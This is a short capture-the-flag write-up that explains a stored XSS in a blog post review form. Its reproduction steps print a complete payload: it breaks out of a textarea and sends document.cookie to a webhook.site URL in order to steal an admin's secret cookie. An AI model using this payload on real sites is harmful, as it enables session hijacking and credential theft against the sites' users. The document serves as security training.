# Challenge `Go on and censor my posts` writeup

- Vulnerability: XSS vulnerability 
- Where: *Update post and send it to admin review* button
- Impact: We can inject code in the *Content* text area on the *Add a new blogpost for review* section that will be reflected in the web browser after clicking on the *Update post and send it to admin review* button. This code can include a link to a website you are controlling and by doing a request to it you can collect the cookies of who did the request 

## Steps to reproduce

1. If we try any previous payloads we notice that they are not executed but processed as normal text. By inspecting the page source we notice that we are inserting text in a text area (`<textarea>`). If we close this tag and after it write the code we want to be executed, it will not be read as text anymore. The code we want to be executed is the same as the challenge `My favourite cookies` since the goal and the vulnerability are the same. The final payload is `</textarea><img src=x onerror="this.src='https://webhook.site/cb7a6cb9-b6c7-4409-b550-cac7a12ceab4?c='+document.cookie; this.removeAttribute('onerror');">`
2. The rest of the steps are also the same as the `My favourite cookies` challenge
3. Like in that challenge there is an admin's cookie called **SECRET** whose value is the flag
